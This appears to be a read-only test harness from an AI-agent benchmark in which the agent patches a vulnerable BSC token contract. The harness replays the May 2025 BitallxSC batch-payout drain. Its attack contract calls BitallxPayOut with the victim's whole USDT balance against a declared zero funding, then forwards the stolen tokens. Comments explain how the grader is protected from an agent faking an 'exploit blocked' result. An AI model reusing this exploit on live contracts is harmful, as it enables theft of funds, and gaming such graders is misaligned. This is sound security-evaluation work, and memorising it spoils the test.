// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// HARNESS FILE — hash-locked, read-only. The agent must NOT edit this file.
// PoC for the BitallxSC unchecked batch-payout drain (BSC, 2025-05).
// Adapted from DeFiHackLabs src/test/2025-05/bitallx_exp.sol.
//
// State-replay model: forks TASK_FORK_URL (the fail-closed record/replay proxy) at the
// incident block and vm.etch'es the code compiled from src/contracts/Token.sol onto the
// live BitallxSC address, so the agent's SOURCE governs the exploit while real storage
// (ownership, the publisher, the configured USDT contract) and the victim's real USDT
// balance are preserved from the fork.

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IBitallxSC {
    function BitallxPayOut(
        address tokencontract,
        address[] calldata wallet,
        uint256[] calldata amount,
        uint256 totalSendAmount
    ) external;
}

contract Bitallx_PoC is Test {
    address constant VICTIM = 0xa5f3728767F834C591eE99C8C5854b752F39C385;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    uint256 constant FORK_BLOCK = 49758338;
    // The victim held 2,029.47 USDT at this block and the attacker took all of it.
    uint256 constant PROFIT_THRESHOLD = 2_000 ether;

    address profitReceiver;

    function setUp() public {
        string memory url = vm.envOr("TASK_FORK_URL", string("bsc"));
        try vm.createSelectFork(url, FORK_BLOCK) { } catch { vm.createSelectFork(url); }
        vm.etch(VICTIM, vm.getDeployedCode("Token.sol:BitallxSC"));
        profitReceiver = address(0xB0BF17);
        deal(USDT, profitReceiver, 0);
    }

    // ---------------------------------------------------------------- phase discipline
    // The grader credits "exploit blocked" when this test fails for a reason the task
    // DECLARES in tests/manifest.json (recognised_block_reasons). Forge reports one reason
    // per test, with no idea which statement produced it, so a failure ANYWHERE in this
    // body could impersonate the block. The shape to guard against: a bare precondition
    // such as `assertGt(IERC20(USDT).balanceOf(VICTIM), …)` as the first statement, whose
    // failure string matches the declared `*assertion failed*` pattern. On this task that
    // precondition is not patch-reachable — it reads USDT's balanceOf at a different
    // address, and USDT is not in `patchable_globs` — but the same structure every PoC in
    // the corpus carries closes it here as well, so no task depends on that reasoning.
    //
    // Only TWO statements below may produce a recognised block reason: the exploit step
    // (phase 1) and the final profit assertion (phase 2). Every read before the exploit,
    // and the profit read after it, converts a failure into a PRECONDITION_/POST_DRAIN_
    // reason that appears in no recognised pattern, so it lands as
    // `inconclusive / unrecognised_failure` for a human instead of as a reward.
    //
    // The monetisation itself needs no wrapper: it lives inside the attack contract's
    // constructor (phase 1) and its only failure string is this harness's own literal
    // "profit transfer failed", which no pattern recognises. It moves USDT, which is not
    // patchable, so a patch to src/contracts/Token.sol cannot make it the failing step
    // while leaving the drain intact.

    function testExploit() public {
        // ---- phase 0: preconditions. A failure here is not evidence of a repair.
        uint256 treasury = _readBalance(VICTIM);
        if (treasury <= PROFIT_THRESHOLD) {
            revert("PRECONDITION_NOT_MET: victim holds no USDT at this block (state not preserved)");
        }

        // ---- phase 1: THE EXPLOIT STEP. This statement, and only this statement, may
        // produce a recognised block reason. The whole attack: ask to be paid the
        // contract's own balance while declaring that zero was funded. Every check in
        // BitallxPayOut is against `totalSendAmount`, and nothing ties the caller-supplied
        // `amount[]` to it. A correct patch bounds the payout and this reverts.
        new BitallxPayOutAttack(profitReceiver);

        // ---- phase 2: the profit read and the oracle assertion.
        uint256 profit = _readProfit(profitReceiver);
        emit log_named_decimal_uint("Attacker USDT profit", profit, 18);
        // EXPLOIT ORACLE: passes iff the attack is profitable. A correct patch bounds the
        // payout by the funded total, the call above reverts, and this test fails — the
        // signal.
        assertGt(profit, PROFIT_THRESHOLD, "exploit did not yield profit (patched?)");
    }

    /// Precondition read. An unreadable view is an unreadable precondition, never a block.
    function _readBalance(address who) internal view returns (uint256) {
        try IERC20(USDT).balanceOf(who) returns (uint256 v) {
            return v;
        } catch {
            revert("PRECONDITION_UNREADABLE: USDT balanceOf() view reverted");
        }
    }

    /// The same read AFTER the drain. The drain already happened, so a failure to read the
    /// takings is a different fact from a blocked exploit and must not read as one.
    function _readProfit(address who) internal view returns (uint256) {
        try IERC20(USDT).balanceOf(who) returns (uint256 v) {
            return v;
        } catch {
            revert("POST_DRAIN_FAILURE: USDT balanceOf() view reverted after the drain");
        }
    }
}

contract BitallxPayOutAttack {
    address constant VICTIM = 0xa5f3728767F834C591eE99C8C5854b752F39C385;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    constructor(address profitReceiver) {
        uint256 victimBalance = IERC20(USDT).balanceOf(VICTIM);

        address[] memory wallets = new address[](1);
        wallets[0] = address(this);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = victimBalance;

        IBitallxSC(VICTIM).BitallxPayOut(USDT, wallets, amounts, 0);

        require(IERC20(USDT).transfer(profitReceiver, IERC20(USDT).balanceOf(address(this))),
                "profit transfer failed");
    }
}
